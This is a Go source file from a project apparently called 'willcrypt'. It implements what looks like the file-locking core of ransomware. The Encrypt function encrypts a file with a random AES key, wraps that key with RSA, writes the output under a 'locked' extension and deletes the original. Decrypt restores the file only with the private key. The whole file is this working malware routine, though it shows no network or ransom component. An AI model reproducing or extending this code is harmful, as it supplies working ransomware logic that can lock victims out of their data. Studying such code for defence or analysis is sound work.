package wcrypt

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"log"
	"os"

	"github.com/sywc670/willcrypt/internal/config"
)

func Encrypt(file string, priv *rsa.PrivateKey) {
	data, err := os.ReadFile(file)
	if err != nil {
		panic(err)
	}
	key := make([]byte, config.KeySize)
	rand.Read(key)

	iv := make([]byte, aes.BlockSize)
	rand.Read(iv)

	header := append(key, iv...)

	pub := priv.PublicKey
	header, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, &pub, header, []byte(""))
	if err != nil {
		panic(err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(data, data)

	data = append(header, data...)

	os.WriteFile(file+config.LockedExtension, data, 0777)

	err = os.Remove(file)
	if err != nil {
		log.Printf("Remove original file %s failed\n", file)
	}
}

func Decrypt(file string, priv *rsa.PrivateKey) {
	data, err := os.ReadFile(file)
	if err != nil {
		panic(err)
	}

	header := data[:config.EncryptedHeaderSize]
	data = data[len(header):]

	header, err = rsa.DecryptOAEP(sha256.New(), nil, priv, header, []byte(""))
	if err != nil {
		panic(err)
	}

	key := header[:config.KeySize]
	iv := header[config.KeySize:]

	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(data, data)

	originalFile := file[:len(file)-len(config.LockedExtension)]
	err = os.WriteFile(originalFile, data, 0777)
	if err != nil {
		panic(err)
	}

	err = os.Remove(file)
	if err != nil {
		log.Printf("Remove encrypted file %s failed\n", file)
	}
}
